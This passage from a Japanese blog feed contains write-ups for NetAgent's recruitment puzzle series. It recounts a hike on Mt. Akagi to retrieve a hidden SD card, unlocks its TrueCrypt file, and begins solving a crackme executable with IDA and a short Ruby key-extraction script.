なるほどがってん、あれはこの血の池を指していたんですね。</p>

<p>血の池の中心に来て辺りを見回すと、そこは静かな森でした。まぁ森に入って来たからあたりまえなのですが。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2441.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2441_thumb.JPG" alt="IMG_2441.JPG" /></a></p>

<p>地図を拡大し、GPSだけを頼りにSDカードの位置まで行くと、kanto1_1.jpgに写っているのと同じような岩がたくさんある場所へと来ました。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2445.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2445_thumb.JPG" alt="IMG_2445.JPG" /></a></p>

<p>よーくkanto1_1.jpgと目の前の岩岩を見比べ、それらしき岩を特定しました。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2446.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2446_thumb.JPG" alt="IMG_2446.JPG" /></a></p>

<p>mondai10.txtによると、<em>ヒント：石の下のミンティア</em>とのことなので、石をめくってみます。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2447.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2447_thumb.JPG" alt="IMG_2447.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2449.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2449_thumb.JPG" alt="IMG_2449.JPG" /></a></p>

<p>ありました！ミンティアアップルフィズ味です！</p>

<iframe src="http://rcm-fe.amazon-adsystem.com/e/cm?lt1=_blank&bc1=000000&IS2=1&bg1=FFFFFF&fc1=000000&lc1=0000FF&t=mzyy-22&o=9&p=8&l=as4&m=amazon&f=ifr&ref=ss_til&asins=B00MQE4MG6" style="width:120px;height:240px;" scrolling="no" marginwidth="0" marginheight="0" frameborder="0"></iframe>


<p>気になる中身は&#8230;</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2451.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2451_thumb.JPG" alt="IMG_2451.JPG" /></a></p>

<p><strong>待望のSDカードでした！やっとみつかりました！</strong>
9:24につくば駅から電車に乗り、15:24に発見したのでかれこれ6時間の旅でした。
ものすごい達成感とSDカードの中身への興味から、岩場に腰を下ろしSDカードをマウントしてみてみました。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2452.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2452_thumb.JPG" alt="IMG_2452.JPG" /></a></p>

<pre style="border:none; color:inherit; background-color:inherit;">
＿人人人人人人人＿
＞ mondai10.tc ＜
￣Y^Y^Y^Y^Y^Y￣
</pre>


<p>またこの形式か！mondai9で解いたのと同じ、パスワード付きTrueCryptファイルです。
パスワードのヒントはSDカード内にあることは容易に想像がつくので解析しようと思いましたが、
帰りのバスが1本しかない上に、ここからバス停まで何分かかるか不明なため、解析は後回しにしてとりあえず森を抜けることにします。
岩場のすぐ近くに県道へ抜ける道の案内看板があったので、それに従って車道へと出ます。</p>

<h3>午後3　帰宅編</h3>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2454.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2454_thumb.JPG" alt="IMG_2454.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2455.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2455_thumb.JPG" alt="IMG_2455.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2457.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2457_thumb.JPG" alt="IMG_2457.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2458.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2458_thumb.JPG" alt="IMG_2458.JPG" /></a></p>

<p>看板の指示通りに歩いていたら、あっさりと県道へと抜けることができ、さらに県道から血の池までの最短ルートとなる登山道の入り口の案内板がありました。
hint7.txtのヤマヒゲナガケンミジンコから血の池が導けていれば、道無き道を進む必要もなく、この看板から血の池へ向かうことができていたかもしれません。</p>

<p>車道へと出たのであとは道なりにバス停へと向かうことにします。
行きに降車した赤城山大洞バス停へは、あの<strong>険しい登山道</strong>を再度通らないといけないため、少し遠回りになりますが、赤城山ビジターセンターへと向かいます。
行きとは逆で、右手に小沼を眺めながら下っていきます。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2461.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2461_thumb.JPG" alt="IMG_2461.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2462.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2462_thumb.JPG" alt="IMG_2462.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2465.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2465_thumb.JPG" alt="IMG_2465.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2466.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2466_thumb.JPG" alt="IMG_2466.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2469.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2469_thumb.JPG" alt="IMG_2469.JPG" /></a></p>

<p>ただただ歩き進むだけだったので、何事もなく赤城山ビジターセンターに到着することができました。</p>

<blockquote class="twitter-tweet" lang="ja"><p><a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 赤城公園ビジターセンター in 前橋市, 群馬県) <a href="https://t.co/UE7XCVkwDv">https://t.co/UE7XCVkwDv</a> <a href="http://t.co/9EkxDzo5hO">pic.twitter.com/9EkxDzo5hO</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584974440947183616">2015, 4月 6</a></blockquote>


<p>赤城山ビジターセンターは閉まっていたので外のベンチに腰掛けました。</p>

<p>ビジターセンター横に、赤城山公園に関するお得な掲示板がありました。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2477.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2477_thumb.JPG" alt="IMG_2477.JPG" /></a></p>

<p>急いで降りてきた甲斐があってか、バスが来るまで1時間も余裕があったので、持って来たコーヒーと板チョコレートで休憩しました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>バスが来るまで1時間あるのでチョコとコーヒーで休憩 <a href="http://t.co/RfTO5ZNJA8">pic.twitter.com/RfTO5ZNJA8</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584980254445305856">2015, 4月 6</a></blockquote>


<p>ここ赤城山ビジターセンターの標高は1365mなため、16:00を過ぎたこの時期は寒く、ダウンジャケットを準備しておいて正解でした。</p>

<blockquote class="twitter-tweet" lang="ja"><p>標高1400mはやっぱり寒い&#10;ダウンジャケット持ってきて正解だったわ</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584977161729093632">2015, 4月 6</a></blockquote>


<p>チョコレートを食べ終わり、辺りを見回すと霞がかかってきました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>あっやばい霞ががってきた <a href="http://t.co/BK7zs4m0L1">pic.twitter.com/BK7zs4m0L1</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584976787811119105">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>雲のなかにいる <a href="http://t.co/5KVkzmPEp8">pic.twitter.com/5KVkzmPEp8</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584980779408556033">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>雨も降ってきたし10m先見えないし怖い <a href="http://t.co/9mq61pmxK3">pic.twitter.com/9mq61pmxK3</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584987757157617664">2015, 4月 6</a></blockquote>


<p>雨も降ってきて、このままバスが来なかったらどうしようといった不安から、すこし怖くなりました。</p>

<p>バス到着予定時刻になり、赤城山ビジターセンターバス停で待っていると定刻通りにバスがきました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>帰りのバス乗った！！！ これで少なくとも下山できる！！！ <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584993731985551360">2015, 4月 6</a></blockquote>


<p>帰りのバスにも乗れ、あとは電車に乗って終電までに帰ることができれば、SDカードの捜索は無事終了となります。</p>

<p>しかしわざわざ群馬県まで来たからには、なにか群馬らしいことをして帰りたいなと思いました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>なぜかグンマーにいるのでGunmaっぽい夕食食べて帰ろうかな</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585002417697099777">2015, 4月 6</a></blockquote>


<p>群馬の名産が何があるか知らなかったので有識者に聞いてみたところ、luminさんからアドバイスをいただきました。</p>

<blockquote class="twitter-tweet" lang="ja"><p><a href="https://twitter.com/mzyy94">@mzyy94</a> 焼きまんじゅう、ひもかわうどん（桐生）</p>&mdash; lumin (@lumin) <a href="https://twitter.com/lumin/status/585006039528972288">2015, 4月 6</a></blockquote>


<p><strong>あっ！！！</strong>
hint3.txtに記載のあったひもかわうどんをすっかり忘れてました！</p>

<p>前橋駅に着き、帰路の途中の駅である高崎駅付近のうどん屋さんへと向かうことを決めました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>駅ついたー 命があるぞー <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 前橋駅 (Maebashi Sta.) in 前橋市, 群馬県) <a href="https://t.co/8530G2c0RA">https://t.co/8530G2c0RA</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585014590695669760">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>mondai解いた時にあったひもかわうどんを食しに行かねば <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585015639519006720">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>よし、高崎のひもかわうどん屋へGo <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585017858687545344">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>食うぜひもかわうどん <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 高崎駅 (Takasaki Sta.) in 高崎市, 群馬県) <a href="https://t.co/tygSOrl8kj">https://t.co/tygSOrl8kj</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585022094821457920">2015, 4月 6</a></blockquote>


<p>高崎駅に到着した直後にまたも雨に降られてしまいましたが、20分ほどかけてひもかわうどんを扱ううどん屋さんへと歩きました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>ひもかわうどん！！ (@ めんいち in 高崎市, 群馬県) <a href="https://t.co/0C5suZrS3F">https://t.co/0C5suZrS3F</a> <a href="http://t.co/4D65OYc4G3">pic.twitter.com/4D65OYc4G3</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585027483772289026">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>hint3.txt kanto1 <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> <a href="http://t.co/ATgu9JllWm">pic.twitter.com/ATgu9JllWm</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585029832964091904">2015, 4月 6</a></blockquote>


<p>名古屋県民の舌にはきしめんを思い出させる食感で、とてもなつかしい気分になりました。</p>

<p>さあ、これで群馬県に思い残すことはありません。
行きで使わなかった学割証を使って高崎駅からJRで南流山まで行き、そこからつくばエクスプレスに乗ってつくば駅に向かって、SDカードの捜索は終了となります。</p>

<blockquote class="twitter-tweet" lang="ja"><p>さらば群馬県 <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 高崎駅 (Takasaki Sta.) in 高崎市, 群馬県) <a href="https://t.co/gWMQTyhwoC">https://t.co/gWMQTyhwoC</a> <a href="http://t.co/zZ4UY6GnbL">pic.twitter.com/zZ4UY6GnbL</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585037725440565248">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>帰路のJR乗った <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585040578011762688">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>帰路の電車で原因不明の停止信号受信でパンダグラフ下ろしたそうで電車内真っ暗とかもう、もう <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585043902886846464">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>我が家に帰ってきたような安心感 <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ つくば駅 (Tsukuba Sta.) in つくば市, 茨城県) <a href="https://t.co/1RrtayjBUG">https://t.co/1RrtayjBUG</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585085754847719425">2015, 4月 6</a></blockquote>


<h2>費用</h2>

<p>SDカードがあった現地まで出向きたいという方のために、参考までにつくば駅から血の池までの往復でかかった運賃を記しておきます。</p>

<table>
<thead>
<tr>
<th style="text-align:center;">区間          </th>
<th style="text-align:center;"> 種別  </th>
<th style="text-align:right;"> 運賃</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center;">つくば→流山おおたかの森 </td>
<td style="text-align:center;"> つくばエクスプレス </td>
<td style="text-align:right;"> 720</td>
</tr>
<tr>
<td style="text-align:center;">流山おおたかの森→足利市 </td>
<td style="text-align:center;"> 東武鉄道 </td>
<td style="text-align:right;"> 885</td>
</tr>
<tr>
<td style="text-align:center;">足利市→足利 </td>
<td style="text-align:center;"> 徒歩 </td>
<td style="text-align:right;"> 0</td>
</tr>
<tr>
<td style="text-align:center;">足利→前橋 </td>
<td style="text-align:center;"> JR </td>
<td style="text-align:right;"> 756</td>
</tr>
<tr>
<td style="text-align:center;">前橋駅→富士見温泉 </td>
<td style="text-align:center;"> 関越交通バス </td>
<td style="text-align:right;"> 600</td>
</tr>
<tr>
<td style="text-align:center;">富士見温泉→赤城山大洞</td>
<td style="text-align:center;"> 関越交通バス </td>
<td style="text-align:right;"> 1200</td>
</tr>
<tr>
<td style="text-align:center;">赤城山ビジターセンター→富士見温泉 </td>
<td style="text-align:center;"> 関越交通バス </td>
<td style="text-align:right;"> 1200</td>
</tr>
<tr>
<td style="text-align:center;">富士見温泉→前橋駅 </td>
<td style="text-align:center;"> 関越交通バス </td>
<td style="text-align:right;"> 600</td>
</tr>
<tr>
<td style="text-align:center;">前橋→高崎 </td>
<td style="text-align:center;"> JR </td>
<td style="text-align:right;"> 195</td>
</tr>
<tr>
<td style="text-align:center;">高崎→南流山 </td>
<td style="text-align:center;"> JR(学割) </td>
<td style="text-align:right;"> 1550</td>
</tr>
<tr>
<td style="text-align:center;">南流山→つくば</td>
<td style="text-align:center;"> つくばエクスプレス </td>
<td style="text-align:right;"> 822</td>
</tr>
</tbody>
</table>


<p>計8,528円でした。所要時間は、9:24につくば駅発の電車に乗って23:24につくば駅に戻ってくることから、
ギリギリの行程で行く場合は、14時間ほどかかる（＝ほぼ丸一日）ということになります。</p>

<h2>SDカードのmondai</h2>

<p>SDカードを手に入れておしまいではありません。SDカードの中にあるmondai10.tcを開かないことには最終面接へ挑むことができません。
とりあえずAutopsyにSDカードを読ませてみます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/16/autopsy-mondai10.png" alt="autopsy-mondai10" /></p>

<p>意外と簡単に問題ファイルが浮上してきました。
削除された0バイトのファイルがあり、そのファイル名は「山名＋最高点の標高を英数字で９文字.txt」となっていました。</p>

<p>登山した赤城山は標高1828mなので、<strong>akagi1828</strong>がmondai10.tcのパスワードだと思われます。</p>

<p>TrueCryptでmondai10.tcを<strong>akagi1828</strong>をパスワードとしてマウントすると、見事イメージをマウントすることができました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/16/mount-mondai10.png" alt="mount-mondai10" /></p>

<p>マウントしたイメージには何があったでしょうか。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/16/final-mondai.png" alt="final-mondai" /></p>

<pre style="border:none; color:inherit; background-color:inherit;">
＿人人人人人人人＿
＞　答え.txt　＜
￣Y^Y^Y^Y^Y^Y￣
</pre>


<h1>感想</h1>

<p>mondai9までは日々の隙間時間を使い、少々躓きながらもなんとか時間をかけて解くことができました。
しかし、mondai10がここまで大変であるとは思っていませんでした。
同じ関東だからと舐めてかかっていたために、ギリギリの乗り換えや予想外の雪道に遭遇してつらい思いをしました。
しかし、マイナビに登録してエントリーするなどの就職活動をし、一次選考と二次選考を通過して最終面接に挑む方々と比べると、
雪道を這い上がるなど、苦労の量は比較的少ないようにも思えます。
このようなmondaiを通して就職の機会を与えてくれたネットエージェントさんに感謝するばかりです。</p>

<p>いろいろなmondaiに挑むことで、いろいろな答えを見つけるセンスを身につけられたかと思います。
このような問題を見つけることがあれば、みなさん是非とも挑戦して技量を高めてみてください。</p>

<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>


<script>
var a = document.querySelectorAll('a[href$=".JPG"]')
for(var i = 0; i < a.length; i++){a[i].target = "_blank"}
</script>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ネットエージェント最終面接問題 Write-up その3]]></title>
    <link href="http://mzyy94.com/blog/2015/04/15/netagent-mondai7-9/"/>
    <updated>2015-04-15T00:01:21+09:00</updated>
    <id>http://mzyy94.com/blog/2015/04/15/netagent-mondai7-9</id>
    <content type="html"><![CDATA[<p>あのネットエージェントのいきなり最終面接問題を解いたのでWrite-upを書きました。</p>

<ul>
<li><a href="http://www.netagent.co.jp/recruit/newgraduates_2016.html">2016年度 新卒採用｜ネットエージェント株式会社</a></li>
</ul>


<p>これまでのmondaiはLinuxやOS Xがあれば解くことができていましたが、mondai7からはWindowsの実行ファイル形式やMicrosoft Officeドキュメントが登場したりと、そろそろWindowsがない環境には手厳しい問題となってきました。
なので、今回の記事に掲載のmondaiはすべて（<code>file</code>コマンドでのファイル情報調査以外）、Windows上での解法となっております。</p>

<p>昨日の<a href="http://mzyy94.com/blog/2015/04/14/netagent-mondai5-6/">mondai6までの解法</a>に続いて本日はmondai7、mondai8、mondai9の解法を公開します。</p>

<!-- more -->


<h1>mondai7</h1>

<p>mondai7はnormal.exeというWIN/PE32実行ファイルを解析して答えを得る問題のようです。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>file normal.exe
</span><span class='line'>normal.exe: PE32 executable <span class="k">for</span> MS Windows <span class="o">(</span>GUI<span class="o">)</span> Intel <span class="m">80386</span> 32-bit
</span></code></pre></td></tr></table></div></figure>


<p>今回はIDA Pro(demo)を使って解析してみます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/normal-ida1.png" alt="normal-ida1.png" /></p>

<p>IDAに解析させて表示を見てみると、おもむろに正解を表示するらしい<em>aCorrectKeyIsS</em>がみつかります。
ここまで来る過程をアセンブリ表示で追っていくことにします。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/normal-ida2.png" alt="normal-ida2.png" /></p>

<p><em>aCorrectKeyIsS</em>はsprintfで渡されるテンプレート文字列で、そこにコマンドライン引数が埋め込められるようにいなっているようです。
このことから、normal.exeにキー候補の文字列をコマンドライン引数として渡して実行し、なにか判定があり、それが正しい場合に<strong>Correct! KEY is : </strong>に続いてその文字列が表示されるようになっていることがわかります。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/normal-ida3.png" alt="normal-ida3.png" /></p>

<p>すこし遡ってみると、キーが表示される部分のサブルーチンへ来る前に、なにやら条件分岐があります。
コマンドライン第一引数の文字長をstrlenでチェックし、0x0A(=10)と比較し、合致しない場合に<strong>Try Again!</strong>と表示する処理がみつかりました。
このことから、キーは10文字長であることがわかります。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/normal-ida4.png" alt="normal-ida4.png" /></p>

<p>キーが表示される直前に行われる処理を見てみると、サブルーチン<em>sub_4011C0</em>を呼んだ戻り値が0の場合、<strong>Try Again!</strong>の表示をさせるようになっています。
<em>sub_4011C0</em>にはコマンドライン引数を渡しているので、この引数が何か特定の文字列と比較されていると推測できます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/normal-ida5.png" alt="normal-ida5.png" /></p>

<p>サブルーチン<em>sub_4011C0</em>のはじめの方では、ループインデックス（以下、i）を0にしたりと、forループの初期化が行われている様子がつかめます。このループの中の処理を見てみます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/normal-ida6.png" alt="normal-ida6.png" /></p>

<p>このforループでは、iが0x0A(=10)になるまでループが回れば1を、途中でbreakが発生すれば0をサブルーチン呼び出し元に返すような処理をしています。
途中でbreakが発生する条件は、ループ内で呼ばれる<em>sub_401170</em>の戻り値と謎の配列<em>dword_40C068</em>の比較が偽である場合となっています。
要するに、このループがi=10になるまで回らないと呼び出し元に0が返され、<strong>Try Again!</strong>が表示されるということです。</p>

<p>コマンドライン引数のi番目の文字が引数として渡されて呼び出されている<em>sub_401170</em>を見てみます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/normal-ida7.png" alt="normal-ida7.png" /></p>

<p><em>sub_401170</em>はサブルーチンの引数で与えられた文字（＝コマンドライン引数のi番目の文字）が、謎の文字列<strong>&#8220;efyTUwxqrY&#8230;&#8221;</strong>の中の何番目に出てくるかを、forループを回して一つずつチェックしているようです。そしてサブルーチンの戻り値として、謎の文字列の何番目に引数の文字が現れたかを呼び出し元に返しています。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/normal-ida8.png" alt="normal-ida8.png" /></p>

<p>謎の配列<em>dword_40C068</em>の中身を見に行くと、unsignled long型の配列として、数値が格納されていました。
先のサブルーチン<em>sub_4011C0</em>のループ内では、コマンドライン引数のi番目の文字を<em>sub_401170</em>に渡し、謎の文字列の何番目に出現するかを取得し、その値とこの<em>dword_40C068</em>のi番目の数値を比較して、同じであればループを継続するという処理でした。</p>

<p>ここまでの調査を基にまとめると、このプログラムの処理は簡易的に以下のようになっていることがわかります。</p>

<ul>
<li>コマンドライン引数に与えられた文字列があり、</li>
<li>その文字列は10文字であり、</li>
<li>その文字列の1文字1文字が謎の文字列<strong>&#8220;efyTUwxqrY&#8230;&#8221;</strong>の何番目に位置するかを調べていて、</li>
<li>その位置がすべて謎の配列<em>dword_40C068</em>に定義されたもの同じであれば<strong>Correct! Key is :</strong>に続けて引数を表示する</li>
</ul>


<p>なので逆に考えると、謎の文字列の中の、謎の配列に定義されている場所の文字を抽出すればキーが見つかるということです。
パパッと以下のようなものを書いてキーを抽出します。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#!/usr/bin/env ruby</span>
</span><span class='line'>
</span><span class='line'><span class="n">string</span> <span class="o">=</span> <span class="s2">&quot;efyTUwxqrYHEFmduCJAXQpgKLBnhiltINPGOoszkMDvcjabSZRVW&quot;</span>
</span><span class='line'><span class="n">indexes</span> <span class="o">=</span> <span class="o">[</span><span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x0f</span><span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="n">key</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="n">indexes</span> <span class="k">do</span>
</span><span class='line'>  <span class="n">key</span> <span class="o">+=</span> <span class="n">string</span><span class="o">[</span><span class="n">i</span><span class="o">]</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="nb">p</span> <span class="n">key</span>
</span></code></pre></td></tr></table></div></figure>




<!--
$ ruby mondai7.rb
"TochuKasou"
-->


<p>試しにnormal.exeの引数に、このコードを実行して得られたキーを与えて実行してみたところ、以下のようになりました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/TochuKasou.png" alt="TochuKasou.png" /></p>

<p>この文字列を与えてmondai8.zipを解凍してmondai7は終了です。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>&gt; 7z.exe x mondai8.zip
</span><span class='line'>
</span><span class='line'>7-Zip <span class="o">[</span>64<span class="o">]</span> 9.35 beta  Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2014 Igor Pavlov  2014-12-07
</span><span class='line'>
</span><span class='line'>Processing archive: mondai8.zip
</span><span class='line'>
</span><span class='line'>Extracting  mondai8.tc
</span><span class='line'>Enter password <span class="o">(</span>will not be echoed<span class="o">)</span>:
</span><span class='line'>
</span><span class='line'>Extracting  mondai8.txt
</span><span class='line'>Extracting  mondai9.zip
</span><span class='line'>
</span><span class='line'>Everything is Ok
</span><span class='line'>
</span><span class='line'>Files: 3
</span><span class='line'>Size:       70339136
</span><span class='line'>Compressed: 70339594
</span><span class='line'>
</span><span class='line'>Kernel  <span class="nv">Time</span> <span class="o">=</span>     0.015 <span class="o">=</span>    0%
</span><span class='line'>User    <span class="nv">Time</span> <span class="o">=</span>     1.170 <span class="o">=</span>   21%
</span><span class='line'>Process <span class="nv">Time</span> <span class="o">=</span>     1.185 <span class="o">=</span>   22%    Virtual  <span class="nv">Memory</span> <span class="o">=</span>      <span class="m">2</span> MB
</span><span class='line'>Global  <span class="nv">Time</span> <span class="o">=</span>     5.379 <span class="o">=</span>  100%    Physical <span class="nv">Memory</span> <span class="o">=</span>      <span class="m">4</span> MB
</span></code></pre></td></tr></table></div></figure>




<!--
$ wine 7z x mondai8.zip -pTochuKasou

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=utf8,Utf16=on,HugeFiles=on,4 CPUs)

Processing archive: mondai8.zip

Extracting  mondai8.tc
Extracting  mondai8.txt
Extracting  mondai9.zip

Everything is Ok

Files: 3
Size:       70339136
Compressed: 70339594
-->


<h1>mondai8</h1>

<p>なにやら怪しげなファイルmondai8.tcと問題文mondai8.txtがあります。mondai8.txtには以下のような記述がありました。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>TrueCrypt pass:mondai8
</span><span class='line'>漢字８文字
</span></code></pre></td></tr></table></div></figure>


